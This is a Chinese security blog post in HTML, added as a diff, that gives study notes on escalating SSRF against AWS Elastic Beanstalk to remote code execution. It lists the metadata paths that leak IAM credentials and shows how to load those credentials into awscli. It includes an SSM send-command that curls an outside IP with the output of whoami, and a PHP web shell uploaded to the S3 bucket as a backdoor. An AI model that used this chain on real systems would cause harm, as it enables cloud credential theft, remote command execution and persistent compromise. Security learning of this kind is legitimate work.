@@ -1,0 +1,232 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>AWS  | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">AWS </h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-15</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
+                    笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/zZTzpgyiG3k/">
+                    SSRF
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <p>学习关于AWS服务器,主要是了解SSRF构造RCE方面</p>
+<h2 id="header-key">header key</h2>
+<h3 id="x-amz-cf-id">X-Amz-Cf-Id</h3>
+<p>AWS Envrion ment</p>
+<h2 id="how-to-know-service">How to know Service</h2>
+<ul>
+<li>/latest/meta-data/iam/security-credentials/
+<ul>
+<li>aws-elasticbeanstalk-ec2-role: AWS Elastic Beanstalk</li>
+</ul>
+</li>
+</ul>
+<h2 id="aws-elastic-beanstalk">AWS Elastic Beanstalk</h2>
+<h3 id="whats-aws-elastic-beanstalk">what’s AWS Elastic Beanstalk？</h3>
+<ul>
+<li>AWS Elastic Beanstalk, is a Platform as a Service (PaaS) offering from AWS for deploying and scaling web applications developed for various environments such as Java, .NET, PHP, Node.js, Python, Ruby and Go.</li>
+<li>It automatically handles the deployment, capacity provisioning, load balancing, auto-scaling, and application health monitoring.</li>
+</ul>
+<h3 id="information-revelation">information revelation</h3>
+<p>Get <strong>AccessKeyId,SecretAccessKey,Token</strong></p>
+<ul>
+<li>/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/</li>
+</ul>
+<p>Get <strong>instanceId,accountId,region</strong></p>
+<ul>
+<li>/latest/dynamic/instance-identity/document/</li>
+</ul>
+<h3 id="how-to-use-credential-information">How to use credential information</h3>
+<h3 id="setting-envrionment">Setting envrionment</h3>
+<pre><code class="language-python">~# apt install awscli
+~# export AWS_ACCESS_KEY_ID=AccessKeyId
+~# export AWS_SECRET_ACCESS_KEY=SecretAccessKey
+~# export AWS_DEFAULT_REGION=region
+~# export AWS_SESSION_TOKEN=Token
+</code></pre>
+<h3 id="get-userid">Get UserID (?</h3>
+<pre><code class="language-python">aws sts get-caller-identity
+</code></pre>
+<h3 id="send-commandescalate-1">Send command（escalate 1）</h3>
+<pre><code class="language-python">ssm send-command
+</code></pre>
+<p>查看<code>whoami</code></p>
+<pre><code class="language-bash">aws ssm send-command — instance-ids “instanceId” — document-name “AWS-RunShellScript” — comment “whoami” — parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ — output text — region=region
+</code></pre>
+<h2 id="escalate">Escalate</h2>
+<h3 id="method-1ssm-send-command">Method 1：ssm send-command</h3>
+<pre><code class="language-bash">aws ssm send-command — instance-ids “instanceId” — document-name “AWS-RunShellScript” — comment “whoami” — parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ — output text — region=region
+</code></pre>
+<h3 id="method-2-ssh">Method 2: ssh</h3>
+<blockquote>
+<p>“creating a RSA authentication key pair (public key and private key), to be able to log into a remote site from the account, without having to type the password.”</p>
+</blockquote>
+<p><strong>Step 1: Using existing information to construct buckeyname</strong></p>
+<pre><code class="language-bash">elasticbeanstalk-&lt;region&gt;-&lt;account-id&gt;
+</code></pre>
+<p>like:</p>
+<p><code>elasticbeanstalk-us-east-1–76xxxxxxxx00</code></p>
+<p><strong>Step 2: Use <code>aws s3 ls</code>  to get bucket resources in a recursive manner</strong></p>
+<pre><code class="language-bash"> aws s3 ls s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ — recursive
+</code></pre>
+<p><strong>Step 3: Upload Backdoor</strong></p>
+<p><code>cmd.php</code></p>
+<pre><code class="language-bash">&lt;?php if(isset($_REQUEST['cmd'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST['cmd']); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; }?&gt;
+</code></pre>
+<pre><code class="language-bash">aws s3 cp cmd.php s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/
+</code></pre>
+<pre><code class="language-bash">upload: ./cmd.php to s3://docs.redact.com/cmd.php
+</code></pre>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://medium.com/@GeneralEG/escalating-ssrf-to-rce-f28c482eb8b9">https://medium.com/@GeneralEG/escalating-ssrf-to-rce-f28c482eb8b9</a></li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/struts2-s2-001-xue-xi-bi-ji/">
+              <h3 class="post-title">
+                下一篇：Struts2 s2-001 学习笔记
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
